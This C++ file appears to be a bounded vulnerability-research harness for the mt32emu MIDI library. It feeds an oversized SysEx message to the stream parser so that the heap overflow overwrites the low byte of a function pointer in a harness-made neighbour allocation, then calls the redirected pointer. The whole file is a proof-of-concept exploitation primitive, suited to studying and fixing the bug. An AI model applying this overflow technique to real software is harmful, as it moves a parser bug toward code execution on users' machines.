// W186 bounded experiment: a SHORT oversized SysEx (32785 bytes, 17 bytes
// past the 32768-byte allocation) overwrites only the LOW BYTE of a live
// function pointer in the real glibc neighbour allocation. All other pointer
// bytes survive, so the pointer can be redirected to a sibling function whose
// address differs only in that byte and whose new byte is 0x00-0x7F (the
// alphabet W170 measured). The base/target pair is chosen at runtime from a
// table of markers so code-layout changes cannot invalidate the experiment.
// Neighbour/victim are harness-created: rung-4 mechanic only, NOT a host or
// rung 5. No parser source byte is changed.
#include <cstdarg>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <new>
#include <unistd.h>

#include "mt32emu.h"
#include "c_interface/c_interface.h"

using namespace MT32Emu;

#define NOINLINE __attribute__((noinline))
#define MARKERS 16

typedef void (*MarkerFn)();

struct Victim {
	MarkerFn fp;
	unsigned char pad[56];
};

static unsigned char *g_buf = NULL;
static Victim *g_victim = NULL;
static unsigned char *g_raw = NULL;
static size_t g_grows = 0;
static uintptr_t g_base = 0;
static uintptr_t g_target = 0;
static int g_target_index = -1;
static const size_t VICTIM_SIZE = 64;
static const size_t CHUNK_PREFIX = 16; // W179: user data at buf+32784
static const size_t OVERWRITE_BYTES = 1;

// Output path must not malloc after the overflow (forged top chunk).
static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

#define DEFINE_MARKER(N) \
	static void NOINLINE marker_##N() { emit("victim=marker_" #N "\n"); }
DEFINE_MARKER(0)
DEFINE_MARKER(1)
DEFINE_MARKER(2)
DEFINE_MARKER(3)
DEFINE_MARKER(4)
DEFINE_MARKER(5)
DEFINE_MARKER(6)
DEFINE_MARKER(7)
DEFINE_MARKER(8)
DEFINE_MARKER(9)
DEFINE_MARKER(10)
DEFINE_MARKER(11)
DEFINE_MARKER(12)
DEFINE_MARKER(13)
DEFINE_MARKER(14)
DEFINE_MARKER(15)
static MarkerFn const markers[MARKERS] = {
	marker_0, marker_1, marker_2, marker_3, marker_4, marker_5, marker_6, marker_7,
	marker_8, marker_9, marker_10, marker_11, marker_12, marker_13, marker_14, marker_15
};

// Pick two functions in the same 256-byte block where the target's low byte
// is 0x00-0x7F. Both addresses are known only at runtime (PIE).
static bool choose_pair() {
	for (int i = 0; i < MARKERS; ++i) {
		uintptr_t a = (uintptr_t)markers[i];
		for (int j = 0; j < MARKERS; ++j) {
			uintptr_t b = (uintptr_t)markers[j];
			if (a != b && (a >> 8) == (b >> 8) && (b & 0xff) < 0x80) {
				g_base = a;
				g_target = b;
				g_target_index = j;
				return true;
			}
		}
	}
	return false;
}

void *operator new[](size_t n) {
	void *p = malloc(n);
	if (n == 32768) {
		++g_grows;
		if (g_buf == NULL) {
			g_buf = static_cast<unsigned char *>(p);
			g_raw = static_cast<unsigned char *>(malloc(VICTIM_SIZE));
			memset(g_raw, 0xA5, VICTIM_SIZE);
			g_victim = new (g_raw) Victim;
			g_victim->fp = (MarkerFn)g_base;
		}
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void dump_ptr(const char *tag, const void *p) {
	char hex[32];
	const unsigned char *b = static_cast<const unsigned char *>(p);
	for (size_t i = 0; i < 8; ++i) snprintf(hex + 2 * i, 3, "%02x", b[i]);
	hex[16] = 0;
	emit("%s=%s\n", tag, hex);
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "attack";
	bool attack = !strcmp(mode, "attack");
	bool pair_ok = choose_pair();
	Bit32u len = attack ? (Bit32u)(32768 + CHUNK_PREFIX + OVERWRITE_BYTES) : 102u;
	Bit8u *stream = new Bit8u[len];
	memset(stream, 0x5a, len);
	stream[0] = 0xF0;
	if (!attack) stream[len - 1] = 0xF7;

	if (attack && pair_ok && g_target)
		stream[32768 + CHUNK_PREFIX] = (unsigned char)(g_target & 0xff);

	Synth synth;
	DefaultMidiStreamParser *parser = new DefaultMidiStreamParser(synth);
	parser->parseStream(stream, len);
	emit("mode=%s len=%u grows=%zu buf=%p victim=%p delta=%ld pair_ok=%d target_index=%d\n",
		mode, len, g_grows, (void *)g_buf, (void *)g_victim,
		g_buf && g_victim ? (long)((unsigned char *)g_victim - g_buf) : -1L,
		pair_ok ? 1 : 0, g_target_index);
	if (!attack || !g_victim) {
		emit("result=no_overflow_or_no_victim\n");
		return 0;
	}
	uintptr_t base_value = g_base, target_value = g_target;
	dump_ptr("victim_base", &base_value);
	dump_ptr("target", &target_value);
	dump_ptr("victim_after", &g_victim->fp);
	if (!pair_ok || !g_target) {
		emit("result=no_encodable_sibling_target\n");
		return 3;
	}
	g_victim->fp();
	return 0; // no destructor: overflow may have corrupted allocator metadata
}
